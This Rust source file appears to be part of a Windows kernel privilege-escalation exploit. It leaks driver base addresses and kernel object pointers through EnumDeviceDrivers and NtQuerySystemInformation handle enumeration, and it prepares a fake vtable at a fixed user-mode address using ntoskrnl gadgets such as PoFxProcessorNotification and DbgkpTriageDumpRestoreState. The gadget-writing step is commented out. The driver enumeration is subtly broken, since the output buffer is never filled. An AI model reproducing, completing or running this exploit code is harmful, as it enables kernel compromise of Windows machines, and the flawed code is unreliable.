use core::ffi::c_void;
use std::os::windows::raw::HANDLE;
use std::ptr::{self, null_mut};
use std::slice;
use windows_sys::Win32::Foundation::STATUS_INFO_LENGTH_MISMATCH;
use windows_sys::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, VirtualAlloc};
use windows_sys::Win32::System::ProcessStatus::{EnumDeviceDrivers, GetDeviceDriverBaseNameW};

use crate::exploit::kernel_gadget::KernelGadget;
use crate::helper::nt_helper;
use crate::ntdll::extern_raw::NtQuerySystemInformation;
use crate::ntdll::system_infomation::class::SystemInformationClass;
use crate::ntdll::system_infomation::system_handle::{SystemHandleInformation, SystemHandleInformationEx, SystemHandleTableEntryInfoEx};


fn get_base_addr(name: String) -> u64 {

    let mut image_size: u32 = 0;
    let status = unsafe {
        EnumDeviceDrivers(
            std::ptr::null_mut::<*mut c_void>(),
            0,
            &mut image_size,
        )
    };
    
    let allocation_size: usize = image_size as usize;

    let p_image_base: *mut c_void = unsafe {
        VirtualAlloc(
            std::ptr::null(),
            allocation_size,
            MEM_RESERVE | MEM_COMMIT,
            PAGE_READWRITE,
        )
    };
    
    let mut driver_base: u64 = 0;
    let driver_count = image_size as usize / size_of::<*mut c_void>();

    let image_bases = p_image_base.cast::<*mut c_void>();

    for i in 0..driver_count {
        let current_image_base: *mut c_void = unsafe {
            *image_bases.add(i)
        };

    if current_image_base.is_null() {
        continue;
    }

    // WCHAR driverName[MAX_PATH]
    let mut driver_name = [0u16; 260];
    let target_name: Vec<u16> = name.encode_utf16().collect();

    let name_length = unsafe {
            GetDeviceDriverBaseNameW(
                current_image_base.cast_const(),
                driver_name.as_mut_ptr(),
                driver_name.len() as u32,
            )
        };

        if name_length == 0 {
            continue;
        }

        // 반환 길이에는 NULL 종료 문자가 포함되지 않는다.
        let name_length = name_length as usize;

        if name_length <= driver_name.len()
            && driver_name[..name_length] == target_name[..]
        {
            driver_base = current_image_base as usize as u64;
            break;
        }
    }
    driver_base
}

fn find_object(pid: u16, d_handle: HANDLE) -> *mut c_void {

    let return_len: u64  = 0;
    let mut buffer_size = 0x1000usize;

    let mut d_kthread: *mut c_void = null_mut();

    let buffer = loop {
        let word_count =
            (buffer_size + size_of::<usize>() - 1)
            / size_of::<usize>();

        let mut buffer = vec![0usize; word_count];

        let actual_size =
            buffer.len() * size_of::<usize>();

        let mut required_size = 0u32;

        let status = unsafe {
            NtQuerySystemInformation(
                SystemInformationClass::SystemHandleInformation,
                buffer.as_mut_ptr().cast::<c_void>(),
                actual_size.try_into().unwrap(),
                &mut required_size,
            )
        };

        if status == STATUS_INFO_LENGTH_MISMATCH {
            buffer_size = required_size as usize + 0x1000;
            continue;
        }

        if !nt_helper::nt_success(status) {
            println!(
                "[!] NtQuerySystemInformation failed: {:#x}",
                status as u32
            );
            return null_mut();
        }

        let info = unsafe {
            &*(buffer.as_ptr() as *const SystemHandleInformationEx)
        };

        let entries = unsafe {
            slice::from_raw_parts(
                info.handles.as_ptr(),
                info.number_of_handles,
            )
        };

        for entry in entries {
            if entry.unique_process_id == pid as usize
                && entry.handle_value == d_handle as usize
            {
                return entry.object;
            }
        }

        break buffer;
    };

    std::ptr::null_mut()
}





fn gadget_setting(){
    let vtable_adress: usize = 0x2100000;
    let ok = unsafe{
        VirtualAlloc(
            vtable_adress as *mut c_void, 
            0x100000, 
             MEM_COMMIT | MEM_RESERVE, 
            PAGE_READWRITE
        )
    };

    let po_fx_processor_notification = KernelGadget::new(
        r"C:\Windows\System32\ntoskrnl.exe", 
        b"PoFxProcessorNotification\0",
    );

    let dbgkp_triage_dump_restore_state = KernelGadget::new(
        r"C:\Windows\System32\ntoskrnl.exe", 
        b"DbgkpTriageDumpRestoreState\0",
    );

    // match (po_fx_processor_notification, dbgkp_triage_dump_restore_state){
    //     (Some(po_fx_processor_notification), Some(dbgkp_triage_dump_restore_state)) => {
    //         ptr::write_unaligned(
    //             base.add(0x48).cast::<u64>(),
    //             base.add(0x300) as usize as u64,
    //         );
    //     },
    //     _ => {}
    // } 

}